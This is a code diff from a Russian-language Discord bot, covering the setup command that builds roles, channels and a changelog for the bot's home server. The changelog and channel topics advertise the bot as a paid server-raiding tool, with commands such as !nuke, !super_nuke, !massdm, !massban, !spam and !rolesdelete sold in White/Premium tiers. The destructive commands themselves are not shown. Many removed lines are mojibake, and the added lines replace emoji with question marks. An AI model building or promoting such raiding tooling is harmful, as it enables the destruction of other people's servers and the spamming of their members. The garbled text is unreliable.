-    # РџРђР РђР›Р›Р•Р›Р¬РќРћР• РїРѕР·РёС†РёРѕРЅРёСЂРѕРІР°РЅРёРµ СЂРѕР»РµР№ - Developer РІС‹С€Рµ Owner
+    # ПАРАЛЛЕЛЬНОЕ позиционирование ролей - Developer выше Owner
     try:
         bot_top = guild.me.top_role.position
         position_tasks = []
@@ -2355,25 +2355,25 @@ async def setup(ctx):
     except Exception:
         pass
 
-    # в”Ђв”Ђ РЎР РђР—РЈ РІС‹РґР°С‘Рј СЂРѕР»СЊ Guest РІСЃРµРј Сѓ РєРѕРіРѕ РЅРµС‚ СЂРѕР»РµР№ в”Ђв”Ђ
+    # -- СРАЗУ выдаём роль Guest всем у кого нет ролей --
     try:
         guest_count = 0
         for member in guild.members:
             if member.bot:
                 continue
-            # РџСЂРѕРІРµСЂСЏРµРј РµСЃС‚СЊ Р»Рё Сѓ СѓС‡Р°СЃС‚РЅРёРєР° СЂРѕР»Рё (РєСЂРѕРјРµ @everyone)
-            if len(member.roles) == 1:  # РўРѕР»СЊРєРѕ @everyone
+            # Проверяем есть ли у участника роли (кроме @everyone)
+            if len(member.roles) == 1:  # Только @everyone
                 try:
-                    await member.add_roles(role_guest, reason="Setup - Р°РІС‚Рѕ-РІС‹РґР°С‡Р° Guest")
+                    await member.add_roles(role_guest, reason="Setup - авто-выдача Guest")
                     guest_count += 1
                 except Exception:
                     pass
         if guest_count > 0:
-            await ctx.send(f"вњ… Р’С‹РґР°РЅР° СЂРѕР»СЊ рџ‘¤ Guest **{guest_count}** СѓС‡Р°СЃС‚РЅРёРєР°Рј.")
+            await ctx.send(f"? Выдана роль ?? Guest **{guest_count}** участникам.")
     except Exception as e:
-        print(f"РћС€РёР±РєР° РїСЂРё РІС‹РґР°С‡Рµ Guest: {e}")
+        print(f"Ошибка при выдаче Guest: {e}")
 
-    # в”Ђв”Ђ 3. @everyone вЂ” РЅРёС‡РµРіРѕ РЅРµ РІРёРґРёС‚ в”Ђв”Ђ
+    # -- 3. @everyone — ничего не видит --
     await guild.default_role.edit(permissions=discord.Permissions(read_messages=False, send_messages=False, connect=False))
 
     def _ow(read=False, write=False):
@@ -2391,116 +2391,116 @@ async def setup(ctx):
             role_dev:    _ow(True, True),
         }
 
-    # в”Ђв”Ђ 4. РљР°С‚РµРіРѕСЂРёРё Рё РєР°РЅР°Р»С‹ в”Ђв”Ђ
+    # -- 4. Категории и каналы --
 
-    # в”Ѓв”Ѓ рџ‘‹ WELCOME вЂ” РІРёРґРµРЅ РІСЃРµРј в”Ѓв”Ѓ
-    cat_welcome = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ рџ‘‹ WELCOME в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites={
+    # ?? ?? WELCOME — виден всем ??
+    cat_welcome = await guild.create_category("???? ?? WELCOME ????", overwrites={
         guild.default_role: _ow(True, False), role_guest: _ow(True, False),
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    welcome_ch = await guild.create_text_channel("рџ‘‹гѓ»welcome", category=cat_welcome, overwrites={
+    welcome_ch = await guild.create_text_channel("???welcome", category=cat_welcome, overwrites={
         guild.default_role: _ow(True, False), role_guest: _ow(True, False),
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РџСЂРёРІРµС‚СЃС‚РІРёРµ РЅРѕРІС‹С… СѓС‡Р°СЃС‚РЅРёРєРѕРІ вЂ” Р±РѕС‚ РїРёС€РµС‚ СЃСЋРґР° Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё")
+    }, topic="Приветствие новых участников — бот пишет сюда автоматически")
 
-    # в”Ѓв”Ѓ в„№пёЏ INFO вЂ” Guest+ С‡РёС‚Р°РµС‚, С‚РѕР»СЊРєРѕ Owner РїРёС€РµС‚ в”Ѓв”Ѓ
-    cat_info = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ в„№пёЏ INFO в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites={
+    # ?? ?? INFO — Guest+ читает, только Owner пишет ??
+    cat_info = await guild.create_category("???? ?? INFO ????", overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, False),
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    info_ch = await guild.create_text_channel("в„№пёЏгѓ»info", category=cat_info, overwrites={
+    info_ch = await guild.create_text_channel("???info", category=cat_info, overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, False),
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РРЅС„РѕСЂРјР°С†РёСЏ Рѕ РїРѕРєСѓРїРєРµ РґРѕСЃС‚СѓРїР° Рё РїРѕРјРѕС‰Рё")
-    changelog_ch = await guild.create_text_channel("рџ“‹гѓ»changelog", category=cat_info, overwrites={
+    }, topic="Информация о покупке доступа и помощи")
+    changelog_ch = await guild.create_text_channel("???changelog", category=cat_info, overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, False),
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РСЃС‚РѕСЂРёСЏ РѕР±РЅРѕРІР»РµРЅРёР№ вЂ” !changelogall")
+    }, topic="История обновлений — !changelogall")
 
-    # РћС‚РїСЂР°РІР»СЏРµРј РїРѕР»РЅС‹Р№ changelog РІ РєР°РЅР°Р» #changelog
-    changelog_embed = discord.Embed(title="рџ“‹ CHANGELOG вЂ” РџРѕР»РЅР°СЏ РёСЃС‚РѕСЂРёСЏ  |  v1.0 в†’ v2.0", color=0x0a0a0a)
-    changelog_embed.add_field(name="в пёЏ v1.0", value="вЂў `!nuke`, `!stop`, `!webhooks`, Р»РѕРіРёСЂРѕРІР°РЅРёРµ", inline=False)
-    changelog_embed.add_field(name="вљЎ v1.1", value="вЂў `!auto_nuke`, `/sp`, `/spkd`, whitelist, `!cleanup`, `!rename`", inline=False)
-    changelog_embed.add_field(name="рџЋЁ v1.2", value="вЂў РўС‘РјРЅС‹Р№ СЃС‚РёР»СЊ, Owner Panel, `!owl_add`, `!invlink`", inline=False)
-    changelog_embed.add_field(name="рџ†• v1.3", value="вЂў Premium СЃРёСЃС‚РµРјР°, `!block_guild`, `!set_spam_text`", inline=False)
-    changelog_embed.add_field(name="рџ†• v1.4", value="вЂў `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
-    changelog_embed.add_field(name="рџ’Ђ v1.5-1.6", value="вЂў `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
-    changelog_embed.add_field(name="рџ”Ґ v1.7", value="вЂў MongoDB, `!pm_add` Р°РІС‚Рѕ +whitelist, `!list`, `!list_clear`", inline=False)
-    changelog_embed.add_field(name="рџ”Ґ v1.8", value="вЂў Freelist, `!owner_nuke`, `!auto_off`, `!setup`, `!nukelogs`, `!fl_add/remove/list/clear`", inline=False)
+    # Отправляем полный changelog в канал #changelog
+    changelog_embed = discord.Embed(title="?? CHANGELOG — Полная история  |  v1.0 > v2.0", color=0x0a0a0a)
+    changelog_embed.add_field(name="?? v1.0", value="• `!nuke`, `!stop`, `!webhooks`, логирование", inline=False)
+    changelog_embed.add_field(name="? v1.1", value="• `!auto_nuke`, `/sp`, `/spkd`, whitelist, `!cleanup`, `!rename`", inline=False)
+    changelog_embed.add_field(name="?? v1.2", value="• Тёмный стиль, Owner Panel, `!owl_add`, `!invlink`", inline=False)
+    changelog_embed.add_field(name="?? v1.3", value="• Premium система, `!block_guild`, `!set_spam_text`", inline=False)
+    changelog_embed.add_field(name="?? v1.4", value="• `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
+    changelog_embed.add_field(name="?? v1.5-1.6", value="• `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
+    changelog_embed.add_field(name="?? v1.7", value="• MongoDB, `!pm_add` авто +whitelist, `!list`, `!list_clear`", inline=False)
+    changelog_embed.add_field(name="?? v1.8", value="• Freelist, `!owner_nuke`, `!auto_off`, `!setup`, `!nukelogs`, `!fl_add/remove/list/clear`", inline=False)
     changelog_embed.add_field(
-        name="рџ”Ґрџ”Ґ v2.0 вЂ” РџРћР›РќР«Р™ Р Р•Р”РР—РђР™Рќ",
+        name="???? v2.0 — ПОЛНЫЙ РЕДИЗАЙН",
         value=(
-            "вЂў РљР°С‚РµРіРѕСЂРёРё: РЎРўРђРўРРЎРўРРљРђ В· FREELIST В· WHITE В· PREMIUM\n"
-            "вЂў РЎС‡С‘С‚С‡РёРєРё СЂРѕР»РµР№, С‚РёРєРµС‚С‹, СЂРѕР»Рё User/Media/Moderator\n"
-            "вЂў !wl_add/pm_add/fl_add РїРѕ username/@mention/ID\n"
-            "вЂў !setup_update вЂ” РѕР±РЅРѕРІРёС‚СЊ Р±РµР· СѓРґР°Р»РµРЅРёСЏ РєР°РЅР°Р»РѕРІ\n"
-            "вЂў !list_clear вЂ” РѕС‡РёС‰Р°РµС‚ РІСЃРµ СЃРїРёСЃРєРё\n"
-            "вЂў ADMIN вЂ” РІСЃРµ РІРёРґСЏС‚, С‚РѕР»СЊРєРѕ Owner РїРёС€РµС‚\n"
-            "вЂў РЎС‚Р°С‚РёСЃС‚РёРєР° РѕР±РЅРѕРІР»СЏРµС‚СЃСЏ Р°РІС‚Рѕ"
+            "• Категории: СТАТИСТИКА · FREELIST · WHITE · PREMIUM\n"
+            "• Счётчики ролей, тикеты, роли User/Media/Moderator\n"
+            "• !wl_add/pm_add/fl_add по username/@mention/ID\n"
+            "• !setup_update — обновить без удаления каналов\n"
+            "• !list_clear — очищает все списки\n"
+            "• ADMIN — все видят, только Owner пишет\n"
+            "• Статистика обновляется авто"
         ),
         inline=False
     )
     changelog_embed.add_field(
-        name="рџ”Ґ v2.1 вЂ” РќРѕРІС‹Рµ С„СѓРЅРєС†РёРё",
+        name="?? v2.1 — Новые функции",
         value=(
-            "вЂў рџ¤ќ Friend, рџЋ¬ Media, рџ›ЎпёЏ Moderator вЂ” РїСЂР°РІРёР»СЊРЅР°СЏ РёРµСЂР°СЂС…РёСЏ\n"
-            "вЂў РђРІС‚Рѕ-СЂРѕР»СЊ рџ‘¤ Guest РїСЂРё РІС…РѕРґРµ\n"
-            "вЂў рџ›’гѓ»sell В· рџЋ«гѓ»РІС‹РґР°С‡Р°-РІР°Р№С‚Р°\n"
-            "вЂў !sync_roles вЂ” СЃРёРЅС…СЂРѕРЅРёР·Р°С†РёСЏ СЂРѕР»РµР№ + Р°РІС‚Рѕ-СѓРґР°Р»РµРЅРёРµ РёР· Р»РёСЃС‚Р°\n"
-            "вЂў !autorole вЂ” СЃС‚Р°С‚СѓСЃ Р°РІС‚Рѕ-СЂРѕР»Рё\n"
-            "вЂў Р›РЎ РєРѕРјР°РЅРґС‹ СЃСЂР°Р·Сѓ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ"
+            "• ?? Friend, ?? Media, ??? Moderator — правильная иерархия\n"
+            "• Авто-роль ?? Guest при входе\n"
+            "• ???sell · ???выдача-вайта\n"
+            "• !sync_roles — синхронизация ролей + авто-удаление из листа\n"
+            "• !autorole — статус авто-роли\n"
+            "• ЛС команды сразу на домашнем сервере"
         ),
         inline=False
     )
     changelog_embed.add_field(
-        name="рџ”Ґ v2.2",
+        name="?? v2.2",
         value=(
-            "вЂў рџЊџ Fame в†’ рџ¤ќ Friend, СЃС‚РѕРёС‚ РЅР°Рґ рџ’Ћ Premium\n"
-            "вЂў рџ¤ќгѓ»admin-chat РІ ADMIN\n"
-            "вЂў РќСЋРєРё Р±С‹СЃС‚СЂРµРµ вЂ” СѓРґР°Р»РµРЅРёРµ Рё СЃРѕР·РґР°РЅРёРµ РїР°СЂР°Р»Р»РµР»СЊРЅРѕ\n"
-            "вЂў РћРІРЅРµСЂ РІСЃРµРіРґР° РѕСЃС‚Р°РЅР°РІР»РёРІР°РµС‚ Р»СЋР±РѕР№ РЅСЋРє\n"
-            "вЂў РђРІС‚Рѕ-Р»РѕРі РІ рџ“Љгѓ»logs РїСЂРё РєР°Р¶РґРѕРј РЅСЋРєРµ\n"
-            "вЂў РЈРґР°Р»РµРЅС‹ `/sp` Рё `/spkd`"
+            "• ?? Fame > ?? Friend, стоит над ?? Premium\n"
+            "• ???admin-chat в ADMIN\n"
+            "• Нюки быстрее — удаление и создание параллельно\n"
+            "• Овнер всегда останавливает любой нюк\n"
+            "• Авто-лог в ???logs при каждом нюке\n"
+            "• Удалены `/sp` и `/spkd`"
         ),
         inline=False
     )
     changelog_embed.add_field(
-        name="рџђ› v2.3 вЂ” Р‘Р°РіС„РёРєСЃС‹",
+        name="?? v2.3 — Багфиксы",
         value=(
-            "вЂў РСЃРїСЂР°РІР»РµРЅ РєСЂРёС‚РёС‡РµСЃРєРёР№ Р±Р°Рі СЃ Р°РІС‚РѕРєСЂР°С€РµРј РґРѕРјР°С€РЅРµРіРѕ СЃРµСЂРІРµСЂР°\n"
-            "вЂў Р—Р°С‰РёС‚Р° РѕС‚ Р°РІС‚Рѕ-РЅСЋРєРѕРІ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ\n"
-            "вЂў Р›РѕРіРёСЂРѕРІР°РЅРёРµ РІСЃРµС… С‚РёРїРѕРІ РЅСЋРєРѕРІ (auto_nuke, auto_super_nuke, auto_owner_nuke)\n"
-            "вЂў РўРѕРєРµРЅ Рё OWNER_ID РІ РїРµСЂРµРјРµРЅРЅС‹С… РѕРєСЂСѓР¶РµРЅРёСЏ\n"
-            "вЂў `!help` Рё `!changelog` СЂР°Р±РѕС‚Р°СЋС‚ РґР»СЏ РІСЃРµС… РЅР° РЅР°С€РµРј СЃРµСЂРІРµСЂРµ\n"
-            "вЂў `!setup` Рё `!setup_update` Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё РІС‹РґР°СЋС‚ СЂРѕР»СЊ рџ‘¤ Guest\n"
-            "вЂў `!compensate` вЂ” СЃРёСЃС‚РµРјР° РєРѕРјРїРµРЅСЃР°С†РёР№ Р·Р° РЅР°Р№РґРµРЅРЅС‹Рµ Р±Р°РіРё"
+            "• Исправлен критический баг с автокрашем домашнего сервера\n"
+            "• Защита от авто-нюков на домашнем сервере\n"
+            "• Логирование всех типов нюков (auto_nuke, auto_super_nuke, auto_owner_nuke)\n"
+            "• Токен и OWNER_ID в переменных окружения\n"
+            "• `!help` и `!changelog` работают для всех на нашем сервере\n"
+            "• `!setup` и `!setup_update` автоматически выдают роль ?? Guest\n"
+            "• `!compensate` — система компенсаций за найденные баги"
         ),
         inline=False
     )
     changelog_embed.add_field(
-        name="рџ”Ґ v2.4 вЂ” РўРµРєСЃС‚, СЃРєРѕСЂРѕСЃС‚СЊ, INFO",
+        name="?? v2.4 — Текст, скорость, INFO",
         value=(
-            "вЂў РќРѕРІС‹Р№ СЃС‚РёР»СЊРЅС‹Р№ С‚РµРєСЃС‚ РЅСЋРєР° СЃ СЂР°РјРєР°РјРё Рё СЂР°Р·РґРµР»РёС‚РµР»СЏРјРё\n"
-            "вЂў РљР°С‚РµРіРѕСЂРёСЏ INFO СЃ #info Рё #changelog\n"
-            "вЂў `guild.chunk()` вЂ” РјРіРЅРѕРІРµРЅРЅР°СЏ Р·Р°РіСЂСѓР·РєР° СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-            "вЂў РђРІС‚Рѕ-РЅСЋРєРё СЂР°Р±РѕС‚Р°СЋС‚ РјР°РєСЃРёРјР°Р»СЊРЅРѕ Р±С‹СЃС‚СЂРѕ\n"
-            "вЂў РЈРґР°Р»РµРЅС‹ `!owner_nuke` Рё `!auto_owner_nuke`\n"
-            "вЂў Р’СЂРµРјРµРЅРЅС‹Рµ РїРѕРґРїРёСЃРєРё РІ РѕС‚РґРµР»СЊРЅРѕР№ СЃРµРєС†РёРё\n"
-            "вЂў `!setup_update` РїРµСЂРµРЅРѕСЃРёС‚ #changelog РІ INFO"
+            "• Новый стильный текст нюка с рамками и разделителями\n"
+            "• Категория INFO с #info и #changelog\n"
+            "• `guild.chunk()` — мгновенная загрузка участников\n"
+            "• Авто-нюки работают максимально быстро\n"
+            "• Удалены `!owner_nuke` и `!auto_owner_nuke`\n"
+            "• Временные подписки в отдельной секции\n"
+            "• `!setup_update` переносит #changelog в INFO"
         ),
         inline=False
     )
-    changelog_embed.set_footer(text="в пёЏ Kanero  |  discord.gg/aud6wwYVRd  |  С‚РµРєСѓС‰Р°СЏ РІРµСЂСЃРёСЏ: v2.4")
+    changelog_embed.set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd  |  текущая версия: v2.4")
     changelog_embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
     await changelog_ch.send(embed=changelog_embed)
 
-    # в”Ѓв”Ѓ рџ“ў РћРЎРќРћР’РќРћР• вЂ” Guest+ С‡РёС‚Р°РµС‚ в”Ѓв”Ѓ
-    cat_main = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ рџ“ў РћРЎРќРћР’РќРћР• в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites={
+    # ?? ?? ОСНОВНОЕ — Guest+ читает ??
+    cat_main = await guild.create_category("???? ?? ОСНОВНОЕ ????", overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, False),
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
@@ -2511,140 +2511,140 @@ async def setup(ctx):
             role_user: _ow(True, False), role_white: _ow(True, False),
             role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
         }
-    rules_ch  = await guild.create_text_channel("рџ“њгѓ»РїСЂР°РІРёР»Р°",  category=cat_main, overwrites=readonly_ow(), topic="РџСЂР°РІРёР»Р° СЃРµСЂРІРµСЂР°")
-    await guild.create_text_channel("рџ“°гѓ»РЅРѕРІРѕСЃС‚Рё",              category=cat_main, overwrites=readonly_ow(), topic="РќРѕРІРѕСЃС‚Рё Kanero вЂ” С‚РѕР»СЊРєРѕ Owner РїРёС€РµС‚")
-    addbot_ch = await guild.create_text_channel("рџ¤–гѓ»addbot",   category=cat_main, overwrites={
+    rules_ch  = await guild.create_text_channel("???правила",  category=cat_main, overwrites=readonly_ow(), topic="Правила сервера")
+    await guild.create_text_channel("???новости",              category=cat_main, overwrites=readonly_ow(), topic="Новости Kanero — только Owner пишет")
+    addbot_ch = await guild.create_text_channel("???addbot",   category=cat_main, overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, True),
         role_user: _ow(True, True), role_white: _ow(True, True),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РќР°РїРёС€Рё СЃСЋРґР° вЂ” РїРѕР»СѓС‡РёС€СЊ СЂРѕР»СЊ User Рё РґРѕСЃС‚СѓРї Рє Р±РѕС‚Сѓ")
-    await guild.create_text_channel("рџ–јпёЏгѓ»РјРµРґРёР°",               category=cat_main, overwrites={
+    }, topic="Напиши сюда — получишь роль User и доступ к боту")
+    await guild.create_text_channel("????медиа",               category=cat_main, overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, False),
         role_user: _ow(True, False),
         role_media: discord.PermissionOverwrite(read_messages=True, send_messages=True, attach_files=True, embed_links=True),
         role_white: _ow(True, False), role_premium: _ow(True, False),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РљР°СЂС‚РёРЅРєРё, РІРёРґРµРѕ, РјРµРјС‹ вЂ” РїРёСЃР°С‚СЊ С‚РѕР»СЊРєРѕ рџЋ¬ Media")
-    await guild.create_text_channel("рџ¤ќгѓ»РїР°СЂС‚РЅС‘СЂСЃС‚РІРѕ",          category=cat_main, overwrites={
+    }, topic="Картинки, видео, мемы — писать только ?? Media")
+    await guild.create_text_channel("???партнёрство",          category=cat_main, overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, False),
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РџСЂРµРґР»РѕР¶РµРЅРёСЏ Рѕ РїР°СЂС‚РЅС‘СЂСЃС‚РІРµ вЂ” РїРёС€РµС‚ С‚РѕР»СЊРєРѕ Р°РґРјРёРЅРёСЃС‚СЂР°С†РёСЏ")
-    await guild.create_text_channel("рџ›’гѓ»sell",                  category=cat_main, overwrites={
+    }, topic="Предложения о партнёрстве — пишет только администрация")
+    await guild.create_text_channel("???sell",                  category=cat_main, overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, False),
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РџСЂРѕРґР°Р¶Р° White/Premium вЂ” РїРёС€РµС‚ С‚РѕР»СЊРєРѕ Owner")
-    await guild.create_text_channel("рџЋ«гѓ»РІС‹РґР°С‡Р°-РІР°Р№С‚Р°",          category=cat_main, overwrites={
+    }, topic="Продажа White/Premium — пишет только Owner")
+    await guild.create_text_channel("???выдача-вайта",          category=cat_main, overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, False),
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="!wl_add, !pm_add, !fl_add, !list, !setup, !auto_off вЂ” С‚РѕР»СЊРєРѕ Owner")
-    await guild.create_text_channel("рџЋЃгѓ»РєРѕРјРїРµРЅСЃР°С†РёСЏ",           category=cat_main, overwrites={
+    }, topic="!wl_add, !pm_add, !fl_add, !list, !setup, !auto_off — только Owner")
+    await guild.create_text_channel("???компенсация",           category=cat_main, overwrites={
         guild.default_role: _ow(True, False), role_guest: _ow(True, False),
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РљРѕРјРїРµРЅСЃР°С†РёРё Рё РІСЂРµРјРµРЅРЅС‹Рµ РїРѕРґРїРёСЃРєРё вЂ” !РєРѕРјРїРµРЅСЃР°С†РёСЏ")
+    }, topic="Компенсации и временные подписки — !компенсация")
 
-    # в”Ѓв”Ѓ рџ’¬ Р§РђРўР« вЂ” Guest+ РїРёС€РµС‚ в”Ѓв”Ѓ
-    cat_chat = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ рџ’¬ Р§РђРўР« в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites={
+    # ?? ?? ЧАТЫ — Guest+ пишет ??
+    cat_chat = await guild.create_category("???? ?? ЧАТЫ ????", overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, True),
         role_user: _ow(True, True), role_white: _ow(True, True),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    await guild.create_text_channel("рџ’¬гѓ»РѕР±С‰РёР№", category=cat_chat, overwrites={
+    await guild.create_text_channel("???общий", category=cat_chat, overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, True),
         role_user: _ow(True, True), role_white: _ow(True, True),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РћР±С‰РёР№ С‡Р°С‚ вЂ” РґРѕСЃС‚СѓРїРµРЅ РґР»СЏ РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ СЃ СЂРѕР»СЊСЋ")
-    await guild.create_text_channel("рџ’Ўгѓ»РёРґРµРё", category=cat_chat, overwrites={
+    }, topic="Общий чат — доступен для всех участников с ролью")
+    await guild.create_text_channel("???идеи", category=cat_chat, overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, True),
         role_user: _ow(True, True), role_white: _ow(True, True),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РџСЂРµРґР»РѕР¶РµРЅРёСЏ Рё РёРґРµРё РґР»СЏ СѓР»СѓС‡С€РµРЅРёСЏ Р±РѕС‚Р°")
-    # рџЋ« create-ticket вЂ” РІРёРґРµРЅ РІСЃРµРј Guest+, РєРЅРѕРїРєР° СЃРѕР·РґР°С‘С‚ РїСЂРёРІР°С‚РЅС‹Р№ РєР°РЅР°Р»
-    ticket_ch = await guild.create_text_channel("рџЋ«гѓ»create-ticket", category=cat_chat, overwrites={
+    }, topic="Предложения и идеи для улучшения бота")
+    # ?? create-ticket — виден всем Guest+, кнопка создаёт приватный канал
+    ticket_ch = await guild.create_text_channel("???create-ticket", category=cat_chat, overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, False),
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РќР°Р¶РјРё РєРЅРѕРїРєСѓ С‡С‚РѕР±С‹ СЃРѕР·РґР°С‚СЊ С‚РёРєРµС‚ РїРѕРґРґРµСЂР¶РєРё")
+    }, topic="Нажми кнопку чтобы создать тикет поддержки")
 
-    # в”Ѓв”Ѓ рџ“‹ FREELIST вЂ” User+ в”Ѓв”Ѓ
-    cat_free = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ рџ“‹ FREELIST в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites={
+    # ?? ?? FREELIST — User+ ??
+    cat_free = await guild.create_category("???? ?? FREELIST ????", overwrites={
         guild.default_role: _ow(), role_guest: _ow(),
         role_user: _ow(True, True), role_white: _ow(True, True),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    await guild.create_text_channel("рџ“‹гѓ»freelist-chat", category=cat_free, overwrites={
+    await guild.create_text_channel("???freelist-chat", category=cat_free, overwrites={
         guild.default_role: _ow(), role_guest: _ow(),
         role_user: _ow(True, True), role_white: _ow(True, True),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="Р§Р°С‚ РґР»СЏ freelist вЂ” !nuke, !auto_nuke, !help, !changelog")
-    await guild.create_text_channel("вќ“гѓ»РїРѕРјРѕС‰СЊ", category=cat_free, overwrites={
+    }, topic="Чат для freelist — !nuke, !auto_nuke, !help, !changelog")
+    await guild.create_text_channel("??помощь", category=cat_free, overwrites={
         guild.default_role: _ow(), role_guest: _ow(),
         role_user: _ow(True, True), role_white: _ow(True, True),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="Р’РѕРїСЂРѕСЃС‹ Рё РїРѕРјРѕС‰СЊ РїРѕ РёСЃРїРѕР»СЊР·РѕРІР°РЅРёСЋ Р±РѕС‚Р°")
+    }, topic="Вопросы и помощь по использованию бота")
 
-    # в”Ѓв”Ѓ вњ… WHITE вЂ” White+ в”Ѓв”Ѓ
-    cat_wl = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ вњ… WHITE в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites={
+    # ?? ? WHITE — White+ ??
+    cat_wl = await guild.create_category("???? ? WHITE ????", overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
         role_white: _ow(True, True), role_premium: _ow(True, True),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    await guild.create_text_channel("вњ…гѓ»white-chat", category=cat_wl, overwrites={
+    await guild.create_text_channel("??white-chat", category=cat_wl, overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
         role_white: _ow(True, True), role_premium: _ow(True, True),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="Р§Р°С‚ РґР»СЏ White вЂ” !nuke [С‚РµРєСЃС‚], !stop, !cleanup, !rename, !nicks_all")
-    await guild.create_text_channel("рџ› пёЏгѓ»РєРѕРјР°РЅРґС‹", category=cat_wl, overwrites={
+    }, topic="Чат для White — !nuke [текст], !stop, !cleanup, !rename, !nicks_all")
+    await guild.create_text_channel("????команды", category=cat_wl, overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
         role_white: _ow(True, True), role_premium: _ow(True, True),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ РєРѕРјР°РЅРґ вЂ” !webhooks, !clear, /sp, /spkd")
+    }, topic="Использование команд — !webhooks, !clear, /sp, /spkd")
 
-    # в”Ѓв”Ѓ рџ’Ћ PREMIUM вЂ” Premium+ в”Ѓв”Ѓ
-    cat_prem_cat = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ рџ’Ћ PREMIUM в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites={
+    # ?? ?? PREMIUM — Premium+ ??
+    cat_prem_cat = await guild.create_category("???? ?? PREMIUM ????", overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    await guild.create_text_channel("рџ’Ћгѓ»premium-chat",  category=cat_prem_cat, overwrites={
+    await guild.create_text_channel("???premium-chat",  category=cat_prem_cat, overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="Р§Р°С‚ РґР»СЏ Premium РїРѕР»СЊР·РѕРІР°С‚РµР»РµР№")
